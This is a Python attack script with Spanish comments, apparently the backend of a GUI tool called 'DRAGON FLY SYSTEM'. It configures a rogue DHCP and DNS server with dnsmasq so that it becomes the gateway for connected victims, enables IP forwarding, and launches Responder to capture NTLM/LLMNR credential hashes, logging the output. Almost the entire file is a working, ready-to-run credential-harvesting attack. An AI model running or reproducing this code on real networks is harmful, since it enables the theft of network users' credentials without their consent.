import os
import subprocess
import time
import re  # 🔥 NUEVO: Importamos la librería de expresiones regulares para limpiar la consola

def iniciar_ataque_red(interface="eth1", callback_consola=None):
    
    def log(texto):
        # 1. 🔥 NUEVO: Expresión regular que detecta y elimina los códigos de escape de color ANSI (ej: \x1b[1;32m)
        texto_limpio = re.sub(r'\x1b\[[0-9;]*m', '', texto)
        
        # 2. 🔥 NUEVO: Limpieza manual de caracteres residuales específicos de Responder o codificación
        reemplazos = ['¤', '[0m', '[1;32m', '[1;34m', '[0;33m']
        for simbolo in reemplazos:
            texto_limpio = texto_limpio.replace(simbolo, '')
            
        # 3. Esto envía el texto LIMPIO a tu pantalla gráfica (CustomTkinter)
        if callback_consola:
            callback_consola(f"{texto_limpio}\n")
        else:
            print(texto_limpio)
        
        # 4. Guardamos una copia exacta y limpia en el bloc de notas
        with open("error_reporte.txt", "a", encoding="utf-8") as archivo_error:
            archivo_error.write(f"{texto_limpio}\n")

    log(f"\n[!] DRAGON FLY SYSTEM")
    log(f"[*] Configurando interfaz: {interface}")
    
    # [FIX 1] Liberación preventiva de puertos para evitar Error 98 de inmediato
    os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
    os.system("sudo pkill -f responder > /dev/null 2>&1")
    os.system("sudo fuser -k 53/udp > /dev/null 2>&1") # Puerto DNS
    os.system("sudo fuser -k 67/udp > /dev/null 2>&1") # Puerto DHCP
    
    dns_proc = None
    proc_responder = None
    
    try:
        # =========================================================================
        # 1. Configuración de Red Local
        # =========================================================================
        log("[*] Levantando interfaz de red...")
        os.system(f"sudo ip link set {interface} up")
        
        # Apaga IPv6 específicamente en la interfaz eth1 para evitar el colapso de sockets
        os.system(f"sudo sysctl -w net.ipv6.conf.{interface}.disable_ipv6=1 > /dev/null 2>&1")
        
        time.sleep(2)
        
        log(f"[*] Asignando IP estática local a {interface}...")
        os.system(f"sudo ip addr flush dev {interface}")
        os.system(f"sudo ip addr add 1.0.0.1/8 dev {interface}")
        
        log("[*] Inyectando rutas estáticas para la comunicación con la víctima...")
        os.system(f"sudo ip route add 1.0.0.0/8 dev {interface} 2>/dev/null")
        os.system(f"sudo ip route add 224.0.0.0/4 dev {interface} 2>/dev/null")
        
        # Activamos el reenvío de IP estándar
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
        
        # 2. DHCP (dnsmasq configurado con máscara Clase A)
        config_dhcp = (
            f"interface={interface}\n"
            f"dhcp-range=1.0.0.10,1.0.0.250,255.0.0.0,12h\n" # Forzamos la máscara 255.0.0.0
            f"dhcp-option=3,1.0.0.1\n"                       # Puerta de enlace
            f"dhcp-option=6,1.0.0.1\n"                       # DNS
            f"bind-interfaces\n"
        )
        
        with open("dnsmasq_temp.conf", "w") as f:
            f.write(config_dhcp)
        
        log("[*] Lanzando servidor DHCP (dnsmasq)...")
        dns_proc = subprocess.Popen(
            ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"], 
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        time.sleep(1) 
        
        log(f"\n[+] INTERFAZ LISTA: {interface}")
        log(f"[+] OBJETIVO: Captura de hashes NTLM / LLMNR")

        # 3. Lanzar Responder y capturar salida
        comando = ["sudo", "responder", "-I", interface, "-wvF"]
        proc_responder = subprocess.Popen(
            comando,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        # [FIX 3] Lectura robusta: si proc_responder termina o es matado por la GUI, salimos limpiamente
        while True:
            linea = proc_responder.stdout.readline()
            if not linea and proc_responder.poll() is not None:
                break
            if linea:
                log(linea.strip())

    except Exception as e:
        log(f"\n[!] Error crítico: {e}")
    finally:
        # 4. LIMPIEZA PROFUNDA (Garantiza que la GUI pueda re-lanzar sin problemas)
        log("\n[*] Deteniendo procesos y restaurando red...")
        
        if dns_proc:
            try:
                os.system(f"sudo kill {dns_proc.pid} > /dev/null 2>&1")
            except: pass
        
        if proc_responder:
            try:
                os.system(f"sudo kill {proc_responder.pid} > /dev/null 2>&1")
            except: pass
            
        # Nos aseguramos barriendo por completo en el espacio del sistema
        os.system("sudo pkill -f responder > /dev/null 2>&1")
        os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
        os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
        
        os.system(f"sudo ip addr flush dev {interface} > /dev/null 2>&1")
        os.system(f"sudo ip link set {interface} down > /dev/null 2>&1")
        
        if os.path.exists("dnsmasq_temp.conf"):
            try: os.remove("dnsmasq_temp.conf")
            except: pass
            
        log("[+] Sistema restaurado. ¡Cacería finalizada!")
